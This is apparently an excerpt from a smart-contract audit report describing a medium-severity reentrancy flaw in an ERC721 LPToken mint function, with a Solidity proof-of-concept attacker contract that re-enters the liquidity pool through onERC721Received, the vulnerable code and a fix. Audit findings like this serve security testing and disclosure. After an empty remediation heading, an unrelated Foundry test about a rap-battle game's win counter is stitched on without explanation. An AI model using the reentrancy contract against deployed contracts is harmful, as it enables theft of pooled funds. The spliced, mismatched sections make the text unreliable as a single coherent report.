3.4 (HAL-04) REENTRANCY ON LPTOKEN
MINTING - MEDIUM
Description:
The LPToken contract is ERC721 token and uses tokenMetadata to keep de-
posit amounts for other ERC20 tokens. When a user deposit native asset
or ERC20 token to the Liquidity Pool over LiquidityProviders contract,
LPToken is getting minted to track this operation. During this process,
LiquidityProvider contract calls lptoken.mint() function and LPToken con-
tract calls ERC721’s _safeMint() function. The _safeMint() function has
any callbacks, and malicious contract with onERC721Received callback can
re-enter to other contracts. This can lead to unexpected situations.
PoC Code:
Note: The following code does not mint unlimited LPTokens with 1 ETH.
It is just added to show that Re-entrancy is possible. However, this
situation may produce unexpected results.
Listing 7: Attack3.sol (Line 16)
1 // SPDX - License - Identifier : UNLICENSED
2
3 pragma solidity 0.8.0;
4 import " ./ LiquidityProviders . sol ";
5 import " @openzeppelin / contracts - upgradeable / token / ERC721 /
ë IERC721ReceiverUpgradeable . sol ";
6
7 contract Attack3 is IERC721ReceiverUpgradeable {
8 LiquidityProviders public liquidityproviders ;
9
10 constructor () public {}
11
12 function setLProvider ( address _lproviders ) external {
13 liquidityproviders = LiquidityProviders ( payable ( _lproviders ));
14 }
15
16 function onERC721Received (
17 address operator ,
24
FINDINGS & TECH DETAILS
18 address from ,
19 uint256 tokenId ,
20 bytes calldata data ) external override returns ( bytes4 ) {
21 if ( tokenId < 10) {
22 liquidityproviders . addNativeLiquidity { value : 1 e12 }() ;
23 return IERC721ReceiverUpgradeable . onERC721Received .
ë selector ;
24 }
25 else {
26 return IERC721ReceiverUpgradeable . onERC721Received .
ë selector ;
27 }
28 }
29
30 receive () external payable {}
31
32 function attack () external payable {
33 liquidityproviders . addNativeLiquidity { value : msg . value }() ;
34 }
35 }
25
FINDINGS & TECH DETAILS
Code Location:
Listing 8: LPToken.sol (Line 65)
63 function mint ( address _to ) external onlyHyphenPools whenNotPaused
ë returns ( uint256 ) {
64 uint256 tokenId = totalSupply () + 1;
65 _safeMint ( _to , tokenId );
66 return tokenId ;
67 }
Recommendation:
It is recommended to implement nonReentrant modifier to the mint function.
Other workarond is using _mint function that does not have callback instead
of _safeMint function.
Remediation Plan:


Impact : High
// POC for the battles won is not updated after the user won the battle

   modifier twoSkilledRappers() {
        vm.startPrank(user);
        oneShot.mintRapper();
        oneShot.approve(address(streets), 0);
        streets.stake(0);
        vm.stopPrank();

        vm.startPrank(challenger);
        oneShot.mintRapper();
        oneShot.approve(address(streets), 1);
        streets.stake(1);
        vm.stopPrank();

        vm.warp(4 days + 1);

        vm.startPrank(user);
        streets.unstake(0);
        vm.stopPrank();
        vm.startPrank(challenger);
        streets.unstake(1);
        vm.stopPrank();
        _;
    }

    
function testWinnerTransferredBetAmount(uint256 randomBlock) public twoSkilledRappers {
        vm.startPrank(user);
        oneShot.approve(address(rapBattle), 0);
        cred.approve(address(rapBattle), 3);
        console.log("User allowance before battle:", cred.allowance(user, address(rapBattle)));
        rapBattle.goOnStageOrBattle(0, 3);
        vm.stopPrank();

        vm.startPrank(challenger);
        oneShot.approve(address(rapBattle), 1);
        cred.approve(address(rapBattle), 3);
        console.log("User allowance before battle:", cred.allowance(challenger, address(rapBattle)));

        // Change the block number so we get different RNG
        vm.roll(randomBlock);
        vm.recordLogs();
        rapBattle.goOnStageOrBattle(1, 3);
        vm.stopPrank();

        Vm.Log[] memory entries = vm.getRecordedLogs();
        // Convert the event bytes32 objects -> address
        address winner = address(uint160(uint256(entries[0].topics[2])));
        assert(cred.balanceOf(winner) == 7);
        console.log("winner is" , winner);
        vm.startPrank(challenger);
        stats = oneShot.getRapperStats(1);
        vm.stopPrank();
        console.log("battlesWon by the Slim Shady is" , stats.battlesWon);
        }


    